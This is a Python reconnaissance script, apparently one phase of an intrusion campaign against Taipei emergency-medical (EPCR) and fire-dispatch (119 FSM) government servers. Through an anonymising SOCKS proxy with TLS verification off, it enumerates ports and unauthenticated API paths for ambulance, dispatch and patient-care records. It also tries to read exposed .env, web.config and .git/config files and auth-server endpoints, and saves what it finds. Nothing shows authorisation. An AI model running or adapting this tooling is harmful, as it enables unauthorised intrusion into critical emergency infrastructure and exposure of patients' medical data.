#!/usr/bin/env python3
"""
Phase 25: EPCR Backend Information Extraction
Reverse-engineer backend config, database connections, server info.
Targets:
1. GET https://epcr.tpf.gov.tw:4000/config - returns authServer + all backend URLs
2. GET https://epcr.tpf.gov.tw:4004/login (probe for config/errors)
3. Proxy probe: fsm.119.gov.taipei/.env (ASP.NET env disclosure)
4. Extract database connection details from JS error handling
5. Probe health/version endpoints
"""
import requests, urllib3, re, json, time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy that worked earlier
PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}

results = {}
output_dir = '/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/'
os_mkdir = __import__('os').makedirs

# Target 1: EPCR config endpoint (returns backend server URLs)
print("=== EPCR Config Endpoint Probes ===")
for port in [4000, 4001, 4002, 4003, 4004, 4005, 4006, 4007, 4008]:
    url = f"https://epcr.tpf.gov.tw:{port}/config"
    try:
        r = requests.get(url, headers=HEADERS, proxies=PROXY, verify=False, timeout=15)
        print(f"  Port {port}/config: [{r.status_code}] len={len(r.text)} server={r.headers.get('Server','?')} ct={r.headers.get('Content-Type','?')}")
        if r.status_code == 200 and len(r.text) > 50:
            try:
                data = r.json()
                print(f"    JSON keys: {list(data.keys())}")
                for k, v in data.items():
                    print(f"    {k}: {v}")
                results[f'epcr_port_{port}_config'] = data
            except:
                print(f"    Raw: {r.text[:500]}")
                results[f'epcr_port_{port}_config_raw'] = r.text[:1000]
            # Save full response
            os_mkdir(output_dir + 'backend_configs', exist_ok=True)
            with open(f'{output_dir}backend_configs/epcr_port_{port}_config.json', 'w') as f:
                f.write(r.text)
    except Exception as e:
        print(f"  Port {port}/config: ERROR - {e}")

# Target 2: EPCR version endpoints
print("\n=== EPCR Version Probes ===")
for port in [4000, 4004]:
    for path in ['/version', '/health', '/healthz', '/api/version', '/api/health', '/status']:
        try:
            r = requests.get(f"https://epcr.tpf.gov.tw:{port}{path}", headers=HEADERS, proxies=PROXY, verify=False, timeout=10)
            print(f"  :{port}{path}: [{r.status_code}] len={len(r.text)} ct={r.headers.get('Content-Type','?')}")
            if r.status_code != 404:
                results[f'epcr_{port}_{path}'] = {'status': r.status_code, 'body': r.text[:500]}
                with open(f'{output_dir}backend_configs/epcr_{port}_{path.replace("/", "_")}.txt', 'w') as f:
                    f.write(r.text)
        except Exception as e:
            print(f"  :{port}{path}: ERROR - {str(e)[:80]}")

# Target 3: Probe backend API endpoints on port 4000 WITHOUT auth
print("\n=== EPCR API Endpoints (no-auth probe) ===")
api_paths = [
    '/config', '/version', '/ambulances', '/Ambulances', '/branches', '/Branches',
    '/DispatchRecords', '/Dispatches', '/Hospitals', '/hospitals', '/Activities/search',
    '/Branches/listBranchWithCaseRecordAndAmbulance', '/Ambulances/byUserRole',
    '/json/isSimulation.json', '/json/hasTP.json', '/stat/stat1', '/stat/stat42To45',
    '/EcgImages/OfDispatchRecord/', '/Pcrs/pcrCaseList', '/Activities/record',
]
for path in api_paths:
    try:
        r = requests.get(f"https://epcr.tpf.gov.tw:4000{path}", headers=HEADERS, proxies=PROXY, verify=False, timeout=10)
        ct = r.headers.get('Content-Type', '?')
        server = r.headers.get('Server', '?')
        print(f"  GET :4000{path}: [{r.status_code}] len={len(r.text)} ct={ct} srv={server}")
        if r.status_code not in [401, 403, 404, 400]:
            results[f'epcr_4000_{path}'] = {'status': r.status_code, 'body': r.text[:2000]}
    except Exception as e:
        print(f"  GET :4000{path}: ERROR - {str(e)[:60]}")

# Target 4: FSM .env and web.config disclosure via proxy
print("\n=== FSM 119 Gov Taipei Backend Disclosure ===")
fsm_paths = [
    '/.env', '/Web.config', '/web.config', '/.git/config', '/config',
    '/phpinfo', '/info.php', '/test', '/console', '/admin',
    '/w/fsm119/index', '/w/fsm119/login', '/api', '/api/config',
    '/api/login', '/api/auth/genToken', '/auth/fetchServerData',
    '/oauth/token', '/sso/login', '/cas/login',
    '/w/fsm119/api/config', '/w/fsm119/api/login',
]
for path in fsm_paths:
    try:
        r = requests.get(f"https://fsm.119.gov.taipei{path}", headers=HEADERS, proxies=PROXY, verify=False, timeout=10, allow_redirects=True)
        server = r.headers.get('Server', '?')
        ct = r.headers.get('Content-Type', '?')
        print(f"  GET fsm{path}: [{r.status_code}] len={len(r.text)} srv={server} ct={ct}")
        results[f'fsm_{path}'] = {
            'status': r.status_code,
            'body': r.text[:3000],
            'headers': dict(r.headers),
        }
        if r.status_code == 200 and len(r.text) > 0:
            with open(f'{output_dir}backend_configs/fsm_{path.replace("/", "_").replace(".", "_")}.html', 'w') as f:
                f.write(r.text)
    except Exception as e:
        print(f"  GET fsm{path}: ERROR - {str(e)[:60]}")

# Target 5: EPCR auth server (port 4004) direct probe
print("\n=== EPCR Auth Server (port 4004) Direct Probe ===")
auth_paths = [
    '/login', '/ssoLogin', '/captcha', '/refreshToken', '/config', '/version',
    '/logout', '/register', '/users', '/oauth/token', '/oauth2/authorize',
    '/swagger', '/api-docs', '/v1/api-docs', '/actuator/health', '/actuator/info',
    '/api/v1/users', '/api/v1/config',
]
for path in auth_paths:
    try:
        r = requests.get(f"https://epcr.tpf.gov.tw:4004{path}", headers=HEADERS, proxies=PROXY, verify=False, timeout=10)
        server = r.headers.get('Server', '?')
        ct = r.headers.get('Content-Type', '?')
        print(f"  GET :4004{path}: [{r.status_code}] len={len(r.text)} srv={server} ct={ct}")
        results[f'auth_4004_{path}'] = {
            'status': r.status_code,
            'body': r.text[:3000],
            'headers': dict(r.headers),
        }
        if r.status_code == 200 and len(r.text) > 50:
            with open(f'{output_dir}backend_configs/auth_4004_{path.replace("/", "_")}.html', 'w') as f:
                f.write(r.text)
    except Exception as e:
        print(f"  GET :4004{path}: ERROR - {str(e)[:60]}")

# Save all results
with open(f'{output_dir}backend_info_extraction.json', 'w') as f:
    json.dump(results, f, indent=2, ensure_ascii=False, default=str)

print(f"\n=== Results saved to {output_dir}backend_info_extraction.json ===")
print(f"Total endpoints probed: {sum(1 for k in results.keys())}")
